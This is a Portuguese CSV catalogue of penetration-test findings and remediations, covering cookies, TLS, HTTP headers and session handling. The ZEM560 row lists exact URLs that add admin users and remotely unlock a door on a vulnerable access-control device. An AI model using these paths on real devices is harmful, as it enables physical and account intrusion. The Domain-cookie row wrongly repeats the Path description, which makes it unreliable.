;Data Source Type;Data Source Key;Vulnerabilidade;Descrição;Outras observações técnicas;Recomendação - Título;Recomendação;Causa raíz;CAT1 - CONTROLE;CAT2 - OWASP;Severidade;Risco (Tags);Referência 1;Referência 2;;;;;;;;;;;;;;
V;;;Cookie - Ausência do atributo Domain;"O atributo path direciona o browser a enviar o cookie apenas para o domínio especifico e subdomínios. Se o atributo for definido por padrão como a raiz (""/"") do website — pode provocar riscos adicionais à segurança desta aplicação, pois não haverá restrições de envio de cookies para outras aplicações que eventualmente estejam hospedadas em outros diretórios do mesmo servidor web.Exemplo 1: Suponha-se que existem duas aplicações no mesmo servidor em pastas distintas, uma em /site1/ e outra em /site2/. O fato de não restringir o escopo do cookie a uma aplicação, fará com que o cookie desta seja acessível para ambas as aplicaçõesExemplo 2:Uma aplicação que encontra-se no domínio xx.com.br e no path /app, no momento que o cookie é recebido no navegador, se a configuração do domínio for enviado como *xx.com.br e no path /, o cookie torna-se acessível para qualquer subdomínio do servidor ou qualquer outra aplicação em um path diferente do previsto, sendo que é recomendável que as configurações deveriam ser definidas para xx.com.br (domain) e /app (path).";-;Cookie - Ausência do atributo Domain;"Deve-se implementar os seguintes controles:1. Restringir o escopo das configurações dos cookies, como as diretivas de path, domain e expire.2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTS";Gerenciamento de sessão;;;Baixo;;;;;;;;;;;;;;;;;
V;;;Cookie - Ausência do atributo HTTP Only;"O atributo HTTPOnly especifica que os cookies não serão acessíveis por nenhum script no navegador (client-side)A falta deste atributo permite que o identificador de sessão seja lido por algum script executando no navegador, possibilitando sua captura e, consequentemente, a personificação da sessão de usuários válidos.";-;Cookie - Ausência do atributo HTTP Only;"Deve-se implementar os seguintes controles:1. Habilitar o atributo HttpOnly nos cookies 2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTS";Gerenciamento de sessão;;OWASP - A6 – Security Misconfiguration;Baixo;;https://www.owasp.org/index.php/HttpOnly;;;;;;;;;;;;;;;
V;;;Cookie - Ausência do atributo Path;"O atributo path direciona o browser a enviar o cookie apenas para o domínio especifico e subdomínios. Se o atributo for definido por padrão como a raiz (""/"") do website — pode provocar riscos adicionais à segurança desta aplicação, pois não haverá restrições de envio de cookies para outras aplicações que eventualmente estejam hospedadas em outros diretórios do mesmo servidor web.Exemplo 1: Suponha-se que existem duas aplicações no mesmo servidor em pastas distintas, uma em /site1/ e outra em /site2/. O fato de não restringir o escopo do cookie a uma aplicação, fará com que o cookie desta seja acessível para ambas as aplicaçõesExemplo 2:Uma aplicação que encontra-se no domínio xx.com.br e no path /app, no momento que o cookie é recebido no navegador, se a configuração do domínio for enviado como *xx.com.br e no path /, o cookie torna-se acessível para qualquer subdomínio do servidor ou qualquer outra aplicação em um path diferente do previsto, sendo que é recomendável que as configurações deveriam ser definidas para xx.com.br (domain) e /app (path).";-;Cookie - Ausência do atributo Path;"Deve-se implementar os seguintes controles:1. Restringir o escopo das configurações dos cookies, como as diretivas de path, domain e expire.2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTS";Gerenciamento de sessão;;;Baixo;;;;;;;;;;;;;;;;;
V;;;Cookie - Ausência do atributo Secure;"O atributo Secure especifica que os cookies serão enviados apenas se a conexão for pelo protocolo HTTPS.A falta deste atributo permite que o identificador de sessão seja enviado por um canal sem criptografia, possibilitando sua captura e, consequentemente, a personificação da sessão de usuários válidos.";-;Cookie - Ausência do atributo Secure;"Deve-se implementar os seguintes controles:1. Habilitar o atributo Secure nos cookies 2. Habilitar no servidor web:• ""X-Frame-Options: SAMEORIGIN”;• ""X-XSS-Protection: 1; mode=block""3. Implementar certificado digital válido com a flag HSTSImplementações:ASP.NETSet the following in Web.config: <httpCookies requireSSL=""true"" />PHPthe flag is set either permanently in php.ini through the parameter: session.cookie_secure = TrueJAVAEEthis can be done by applying the following configuration in web.xml:<session-config> <cookie-config> <secure>true</secure> </cookie-config></session-config>";Gerenciamento de sessão;;OWASP - A6 – Security Misconfiguration;Baixo;;https://www.owasp.org/index.php/SecureFlag;;;;;;;;;;;;;;;
V;;;Cross-Site Flashing;O servidor web contém um arquivo crossdomain.xml com diretivas que permitem interação com scripts externos do Adobe Flash (SWF).;-;Cross-Site Flashing;"Deve-se adicionar ao arquivo crossdomain.xml , somente os domínios confiáveis, qualquer outra entrada deve ser removida.Exemplo:<cross-domain-policy><site-control permitted-cross-domain-policies=""by-content-type""/><allow-access-from domain=""*.site1.com"" /><allow-access-from domain=""*.site2.com"" />...</cross-domain-policy>";Gerenciamento de Configuração;;OWASP - A7 – Cross-site Scripting (XSS);-;;https://www.adobe.com/devnet/flashplayer/articles/cross_domain_policy.html;;;;;;;;;;;;;;;
V;;;Dispositivo DVR vulnerável;O dispositivo está vulnerável a LFD (Local File disclousure). Essa vulnerabilidade torna possível a leitura de arquivos locais do dispositivo. O usuário mal-intencionado pode fazer uso dessa vulnerabilidade para ler o arquivo de senhas do dispositivo e logo em seguida acessar o mesmo com as credenciais roubadas.;-;Dispositivo DVR vulnerável;"Deve-se implementar as seguintes recomendações:•        Desativar acesso via telnet;•        Desativar acesso a interface web ou restringir acesso ao mesmo;•        Utilizar política de senha forte no acesso remoto;•        Atualizar o firmware do equipamento.";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
V;;;Dispositivo ZEM560 vulnerável;"O dispositivo possui vulnerabilidades conhecidas que permite:•	Acessar a interface de administração do dispositivo, sem uma credencial válida•	Criar outras contas de usuários com poderes administrativos através do link http://IP/csl/user?action=add•	Abrir a porta física da empesa de forma remota, através do link http://IP/form/Device?act=9•	Gerar relatórios dos usuários existentes através do link http:/IP/csl/user";-;Dispositivo ZEM560 vulnerável;"O Fabricante não forneceu atualização de segurança para essa vulnerabilidade. Sendo assim as opções para mitigar a mesma são: •	Isolar o dispositivo numa rede sem comunicação com a rede de operações; ou•	Trocar o dispositivo.";Gerenciamento de Configuração;;;;;https://blog.zerial.org/seguridad/vulnerar-la-seguridad-fisica-de-un-control-de-acceso-biometrico/;;;;;;;;;;;;;;;
V;;;Headers - HTTP Strict Transport Security (HSTS) não está habilitado;"O servidor não possui o atributo HTTP Strict Transport Security (HSTS), que é um controle de segurança implementado no servidor web e também nos browsers (Chrome, Firefox, Internet Explorer, etc), onde sua funcionalidade consiste em uma flag (Strict-Transport-Security) configurada no header do vhost do servidor web e com um certificado válido reconhecido pelos navegadores, forçando que cada requisição enviada pelo navegador utilize o protocolo TLS. Após implementado este controle:•        O navegador impedirá que qualquer comunicação entre o servidor e o cliente seja enviada por HTTP, somente via HTTPS; •        Ataques man-in-the-middle não serão possíveis, pois o browser (cliente) não permitirá o uso de um certificado inválido.";-;Headers - HTTP Strict Transport Security (HSTS) não está habilitado;"Deve-se aplicar as seguintes práticas de segurança1 - Utilizar um certificado digital de uma CA pública2 - Habilitar o cabeçalho Strict Transport Security (HSTS) no vhost IISAdicione as seguintes linhas no arquivo web.config<?xml version=""1.0"" encoding=""UTF-8""?><configuration>  <system.webServer>    <httpProtocol>      <customHeaders>        <add name=""Strict-Transport-Security"" value=""max-age=31536000"" />      </customHeaders>    </httpProtocol>  </system.webServer></configuration>    ApacheAdicione a seguinte linha no arquivo de configuraçãoHeader add Strict-Transport-Security ""max-age=15768000""Nginx Adicione a seguinte linha no arquivo de configuraçãoadd_header Strict-Transport-Security ""max-age=15768000"";";Gerenciamento de Configuração;;OWASP - A6 – Security Misconfiguration;-;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.md;;;;;;;;;;;;;;;;
V;;;Headers - X-Frame-Options não está habilitado;Este controle de segurança evita que atques como por exemplo: clickjacking e xss sejam explorado na aplicação;-;Headers - X-Frame-Options não está habilitado;Deve-se ativar o cabeçalho X-Frame-Options no servidor web;Gerenciamento de configuração;;;;;https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers;;;;;;;;;;;;;;;
V;;;Identificação de versão de serviços e tecnologias no cabeçalho HTTP;Foi identificado as tecnologias e versões adotadas pelo servidor por meio do cabeçalho das respostas HTTP recebidas. A divulgação dessas informações facilita a busca por vulnerabilidades especificas, que podem ocasionar uma eventual exploração.;A aplicação não exibe as informações de versão ao utilizar os métodos HTTP GET e POST, porém ao utilizar o método OPTIONS ou através da tentativa de acesso à outra aplicação hospedada no mesmo servidor, informações de versão do servidor Web e frameworks são exibidas.;Identificação de versão de serviços e tecnologias no cabeçalho HTTP;Recomenda-se remover essas informações do cabeçalho HTTP a fim de evitar ou dificultar a identificação dessas informações.;Gerenciamento de Configuração;;;INFORMATIVE;;;;;;;;;;;;;;;;;
V;;;Métodos HTTP inseguros;Recomenda-se manter habilitado apenas os métodos HEAD, GET e POST, os demais métodos devem ser desabilitados, porém caso seja necessário o uso de algum outro método não definido acima, o acesso ao mesmo deve ser restrito.;-;Métodos HTTP inseguros;"Recomenda-se manter habilitado apenas os métodos HEAD, GET e POST, os demais métodos devem ser desabilitados, porém caso seja necessário o uso de algum outro método não definido acima, o acesso ao mesmo deve ser restrito.Não se deve utilizar ou permitir métodos que são considerados inseguros:	•	PUT;•	DELETE;•	TRACE;	•	CONNECT;•	OPTIONS.Descrições:•	OPTIONS: Representa uma solicitação de informações sobre as opções de comunicação disponíveis na cadeia de solicitação / resposta identificadas pelo Request-URI;•	TRACE: método HTTP que permite analisar como a aplicação se comporta ao receber determinadas requisições. Usuários mal-intencionados podem utilizar essa informação para identificar se a requisição está sendo manipulada por um firewall, por exemplo, ou analisar o comportamento da aplicação;•	Em caso de outras aplicações, os métodos PUT, DELETE, CONNECT podem permitir o cliente a adicionar e remover arquivos no servidor web, utilizá-lo como um proxy e executar ataques de Cross-Site Tracing (XST), respectivamente;•	Os métodos PUT e DELETE, com os devidos controles de segurança, podem ser utilizados em aplicações com REST.";Gerenciamento de Configuração;Desabilitar métodos HTTP inseguros;;LOW;;;;;;;;;;;;;;;;;
V;;;NGINX com vulnerabilidades conhecidas;Vulnerabilidades foram encontradas na implementação do HTTP/2 que podem causar o consumo excessivo de memória e de uso de CPU. Essa vulnerabilidade afeta todas as versões entre 1.9.5 e 1.15.4.;-;NGINX com vulnerabilidades conhecidas;Para mitigar essa vulnerabilidade deve-se atualizar o NGINX.;Gerenciamento de Configuração;;;;;http://mailman.nginx.org/pipermail/nginx-announce/2018/000220.html;;;;;;;;;;;;;;;
V;;;O ativo está acessível através de credencial padrão;O ativo está acessível por meio das credenciais padrão do fabricante. Um usuário mal-intencionado ao obter acesso a console administrativa teria acesso às configurações da aplicação, permitindo a alteração de parâmetros e/ ou serviços.;-;O ativo está acessível através de credencial padrão;"Deve se implementar os seguintes controles de segurança:1. Troca imediata da senha default do fabricante; 2. Restringir remoto somente IPs autorizados.";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
V;;;Serviços e módulos com versão desatualizada;Foram detectados serviços e módulos que estão em funcionamento com a versão desatualizada, que permite a exploração de vulnerabilidades no serviço e conseqüentemente comprometimento do servidor e informações nele armazenadas.;-;Serviços e módulos com versão desatualizada;Deve-se atualizar o software para a última versão e aplicar as atualizações existentes, conforme o site do fornecedor.;Gerenciamento de Configuração;;;MEDIUM;;;;;;;;;;;;;;;;;
V;;;Serviços e módulos com versão descontinuada;Foram detectados serviços e módulos que estão em funcionamento com a versão desatualizada, que permite a exploração de vulnerabilidades no serviço e conseqüentemente comprometimento do servidor e informações nele armazenadas.;-;Serviços e módulos com versão descontinuada;"Recomenda-se aplicar uma destas recomendações1. Trocar a versão do serviço utilizado, para a mais recente fornecida pelo fornecedor;2. Restringir o acesso ao serviço através de segmentação de rede, com um firewall que filtre o conteúdo que é direcionado ao mesmo, garantindo que as vulnerabilidades existentes não serão exploradas e esse risco estará sobre controle.";Gerenciamento de Configuração;;;;;;;;;;;;;;;;;;;;
V;;;O serviço Web está expondo informações sensíveis por meio do arquivo robots.txt;O arquivo robots.txt, utilizado por sites de busca na indexação de conteúdos, contém informações que ajudam a identificação de diretórios que possam conter conteúdos sensíveis.;-;O serviço Web está expondo informações sensíveis por meio do arquivo robots.txt;Revisar o conteúdo do arquivo robots.txt, localizado na raiz do diretório de publicação. O arquivo deve conter somente os recursos disponibilizados publicamente.;Gerenciamento de Configuração;;;INFORMATIVE;;;;;;;;;;;;;;;;;
V;;;Bypass do protocolo 802.1x;"O protocolo 802.1x é utilizado para controle de acesso de redes, provendo mecanismos de autenticação para dispositivos que desejam acessar a rede LAN ou WLAN.Usuários mal-intencionados com acesso físico ao ambiente podem explorar dispositivos que não oferecem suporte ao protocolo 802.1x ou não estão configurados de forma segura (impressoras e telefones IP, por exemplo) para obter acesso à rede, utilizando as portas e endereço MAC de tais equipamentos. Uma vez realizado o bypass do protocolo 802.1x e com acesso à rede, tais usuários mal-intencionados podem ter acesso ao ambiente corporativo.";-;Bypass do protocolo 802.1x;"Como forma de recomendação para correção da vulnerabilidades, é importante que a empresa implemente:•        Controle de acesso físico ao ambiente, permitindo a entrada somente de pessoas autorizadas;•        Segmentação da rede de voz em relação à rede de dados (VLANs);•        Para impressoras e outros dispositivos sem suporte ao protocolo 802.1x, utilizar um firewall para garantir que em caso de algum tipo de acesso, a comunicação fique restrita somente aos serviços necessário dentro daquele escopo de rede;•        Bloquear o acesso do usuário as configurações no telefone IP (Desabilitar o acesso ao Settings Access dentro do CUCM);•        Retirar a etiqueta no telefone IP, onde possui o endereço MAC, pois caso essa informação seja coletada, é possível realizar o bypass do protocolo 802.1x;•        Em caso do dispositivo oferecer suporte, configurar os mesmos para que utilizem o protocolo 802.1x para acesso seguro à rede;•        Monitorar tráfego na VLAN de voz, para identificar ações maliciosas";Gerenciamento de Criptografia;;;;;;;;;;;;;;;;;;;;
V;;;Cifras fracas habilitadas (SSL/TLS);O principal benefício da segurança da camada de transporte é a proteção dos dados de aplicações web contra divulgação e modificação não autorizadas quando são transmitidos entre clientes (navegadores) e o servidor da aplicação e entre o servidor e o back-end e outros componentes corporativos. Com base nisso cifras seguras devem ser implementadas para garantir a segurança nessa comunicação.;-;Cifras fracas habilitadas (SSL/TLS);"Desabilitar o uso de todas as versões do SSL, assim como o TLSLv1.0 e TLSv1.1Com relação ao TLSv1.2 recomenda-se desabilitar as cifras fracas e/ou com vulnerabilidades conhecidas.";Gerenciamento de Criptografia;;OWASP - A6 – Security Misconfiguration;-;;https://httpd.apache.org/docs/trunk/en/ssl/ssl_howto.html;https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/;;;;;;;;;;;;;;
V;;Suíte de Cifras Fracas;O servidor está utilizando chaves criptográficas inadequadas para o protocolo SSL/TLS.;"O servidor está permitindo o estabelecimento de conexões utilizando chaves criptográficas vulneráveis. Essa situação permite que um usuário mal-intencionado execute ataques de man-in-the-middle ou decifre a comunicação entre um cliente e o servidor.O browser do cliente define um processo para estabelecer a conexão segura com o servidor, após este “anunciar” os algoritmos e cifras suportadas. No entanto, é possível forçar o uso de um algoritmo de criptografia fraco, caso solicitado pelo cliente.";-;O servidor está utilizando chaves criptográficas inadequadas para o protocolo SSL/TLS.;"Recomenda-se a configuração da biblioteca de criptografia de modo a utilizar somente conjunto de cifras fortes, assim como desabilite todas as demais cifras.No servidor web IIS, pode-se utilizar a ferramenta IIS Crypto https://www.nartac.com/Products/IISCryptoPara os servidores abaixo é possível utilizar esta ferramenta do Mozilla Security - https://mozilla.github.io/server-side-tls/ssl-config-generator• Apache • Nginx • Lighttpd • HAProxy • AWS ELB";Gerenciamento de Criptografia;Suites de cifras frotes;;LOW;;;;;;;;;;;;;;;;;
V;;Suíte de Cifras Fracas;Suíte de Cifras Fracas;"O servidor está permitindo o estabelecimento de conexões utilizando chaves criptográficas vulneráveis. Essa situação permite que um usuário mal-intencionado execute ataques de man-in-the-middle ou decifre a comunicação entre um cliente e o servidor.O browser do cliente define um processo para estabelecer a conexão segura com o servidor, após este “anunciar” os algoritmos e cifras suportadas. No entanto, é possível forçar o uso de um algoritmo de criptografia fraco, caso solicitado pelo cliente.";-;Suíte de Cifras Fracas;"Recomenda-se a configuração da biblioteca de criptografia de modo a utilizar somente conjunto de cifras fortes, assim como desabilite todas as demais cifras.No servidor web IIS, pode-se utilizar a ferramenta IIS Crypto https://www.nartac.com/Products/IISCryptoPara os servidores abaixo é possível utilizar esta ferramenta do Mozilla Security - https://mozilla.github.io/server-side-tls/ssl-config-generator• Apache • Nginx • Lighttpd • HAProxy • AWS ELB";Gerenciamento de Criptografia;Suites de cifras frotes;;LOW;;;;;;;;;;;;;;;;;
;;;Erro SSL - Certificado Auto-Assinado;Foi detectado que o servidor está auto-assinando o certificado. Este procedimento não garante para o cliente a confiabilidade da assinatura e autenticidade da origem. Desta forma um usuário mal-intencionado poderia clonar o certificado ou criar um próprio e utilizá-lo em um Replay Attack para personificar a identidade do verdadeiro servidor.<br/><br/><br/><br/>Na presente situação não há garantia que o certificado é confiável, apenas indica que é um certificado gerado por um servidor.;-;Erro SSL - Certificado Auto-Assinado;Deve ser utilizado um certificado digital emitido por uma autoridade certificadora (CA) reconhecida internacionalmente.;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
;;;Erro SSL - Certificado emitido por outro servidor;Foi identificado que o certificado digital está sendo emitido por um servidor que não é o utilizado pela própria aplicação.<br/><br/>Está situação fere os princípios de confiabilidade e autenticidade do servidor de aplicação.;-;Erro SSL - Certificado emitido por outro servidor;O certificado digital deve ser emitido pelo servidor de aplicação.;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
;;;Erro SSL - Certificado Expirado;"Foi identificado que o certificado digital utilizado pela aplicação foi expirado. Essa situação causa a falta de confiabilidade entre a aplicação e os clientes e acarreta na diminuição da credibilidade da empresa, pois quando um cliente vir a acessar a aplicação Web, lhe será exibido uma mensagem de que ""o presente site não é seguro"". Isso gerará desconfiança por parte dos clientes, podendo levar a diminuição de acesso a aplicação.";-;Erro SSL - Certificado Expirado;Deve-se renovar a validade do certificado digital junto a autoridade certificadora do antigo certificado.;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
;;;O servidor está utilizando uma versão de OpenSSL que possui falhas de segurança.;O certificado SSL utilizado pelo serviço em questão possui conhecidas falhas de segurança, devido sua versão estar desatualizada.;-;O servidor está utilizando uma versão de OpenSSL que possui falhas de segurança.;Desativar o SSLv2 e SSLv3.<br/><br/>Habilitar o TLS1.2<br/><br/><br/><br/>No Windows:<br/><br/>Aplicar os patchs de correção: <br/><br/>MS12-006 - http://technet.microsoft.com/en-us/security/bulletin/ms12-006<br/><br/>MS13-006 - http://technet.microsoft.com/en-us/security/bulletin/ms13-006<br/><br/>O fabricante também disponibilizou alguns procedimentos para eventuais problemas após a instalação do patch de correção em http://support.microsoft.com/kb/2643584<br/><br/><br/><br/>No Linux<br/><br/>Atualizar o OpenSSL para a versão 1.0.2d, 1.0.0p ou superior..<br/><br/>ou<br/><br/>Edite o arquivo /etc/httpd/conf.d/ssl.conf<br/><br/>Insira o parâmetro SSLInsecureRenegotiation off<br/><br/>Reinicie o Apache service httpd restart;Gerenciamento de Criptografia;;;LOW;;;;;;;;;;;;;;;;;
;;;TLS 1.0 Enabled;"O servidor da Web suporta criptografia por meio do TLS 1.0, que não é considerado ""criptografia robusta"" e possui vulnerabilidades.";-;;;Gerenciamento de Criptografia;;;;;;;;;;;;;;;;;;;;
V;;;Acesso anônimo a arquivos da aplicação;A aplicação permite o acesso à documentos internos sem a necessidade de autenticação de um usuário válido. Dessa forma, usuários mal-intencionados podem visualizar documentos contendo informações pessoais e sigilosas de clientes e pacientes;-;Acesso anônimo a arquivos da aplicação;Deve ser validado as credenciais e/ou sessões ativas para todas as solicitações de acesso a páginas restritas ao servidor de aplicação. Esta validação deve verificar a existência de credenciais e cookies de sessão no processo de solicitação da página requerente, se a mesma é válida e caso seja, deve ser concedido os privilégios necessários aquele determinado perfil de usuário.;Gerenciamento de sessão;;;HIGH;;;;;;;;;;;;;;;;;
V;;;Conexões simultâneas;"A aplicação permite a abertura de duas sessões utilizando a mesma credencial partindo de computadores distintos, simultaneamente.Essa situação fere o princípio do não-repúdio e dificulta a rastreabilidade das ações maliciosas no sistema, na situação de dois usuários autenticarem na aplicação com a mesma credencial e um deles realizar alguma ação maliciosa no sistema.";-;Conexões simultâneas;"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;LOW;;;;;;;;;;;;;;;;;
V;;ROUBO DE SESSÃO;Roubo de Sessão;"O roubo de sessão consiste em acessar páginas restritas da aplicação, utilizando o cookie de sessão de um usuário legítimo e ativo no sistema, sem necessidade de credenciais válidas a partir de um computador distinto.Ao forçar a utilização de uma sessão ativa (SESSIONID), foi possível personificar o usuário relativo à sessão e acessar páginas restritas na aplicação.Esta situação coloca em risco a integridade do sistema e fere os princípios do não-repúdio e da rastreabilidade de ações.";-;Roubo de Sessão;"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;HIGH;;;;;;;;;;;;;;;;;
V;;ROUBO DE SESSÃO;Sessão Inadequada (Session Fixation);No processo de autenticação do usuário a aplicação faz reuso de um SESSION ID já existente para aquele navegador, os controles de sessão da aplicação não destroem as sessões no momento de logoff ou após um determinado período sem atividade. Esta situação faz com que o identificador do usuário na sessão possa ser comprometido por sniffing de rede ou outros ataques como o XSS, e seja reutilizado por um usuário mal-intencionado. ;-;Sessão Inadequada (Session Fixation);"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;HIGH;;;;;;;;;;;;;;;;;
V;;;Tempo de expiração de sessão;O tempo para expiração da sessão autenticada, que está inativa é maior que 10 minutos. Esta situação pode permitir que a sessão seja interceptada e reutilizada.;-;Tempo de expiração de sessão;"Os cookies devem seguir os seguintes requisitos:•	A geração do cookie deve utilizar algoritmos conhecidos, padronizados e bem testados, que garantam a aleatoriedade dos identificadores de sessão para evitar que um usuário mal-intencionado descubra-os através de predição lógica/matemática;•	Ao fim de uma sessão ou após 30 minutos de inatividade o SESSIONID deve ser destruído de forma a não poder mais ser utilizado;•	Sempre que o usuário executar a autenticação, um novo cookie de sessão deve ser enviado, retirando o cookie antigo (que o usuário possuía antes de executar a autenticação);•	O SESSIONID deve estar atrelado a informações provindas do cliente que realizou o acesso, tais como, IP de origem, User-agent e geo-localização;•	No caso de um SESSIONID ser utilizado de um cliente cujas informações são diferentes às armazenadas na criação do SESSIONID, a sessão e o SESSIONID deverão ser destruídos e uma nova autenticação deve ser realizada.O cookie de sessão não deve ser:•	Trafegado na URL (GET);•	Escondido em campos HIDDEN do formulário HTML;•	Expostos em mensagens de erro e logs..Esconder cookies de sessão ou trafega-los na URL pode permitir vetores para o vazamento facilitado do controlador de sessão.A previsibilidade do cookie de sessão pode permitir a obtenção de sessões válidas no sistema por meio de agentes não autorizados.Permitir sessões persistentes (que não expiram) aumenta o tempo para a execução de ataques.Não alterar o cookie durante a autenticação permite que sejam estabelecidos ataques de fixação de sessão.";Gerenciamento de sessão;;;LOW;;;;;;;;;;;;;;;;;
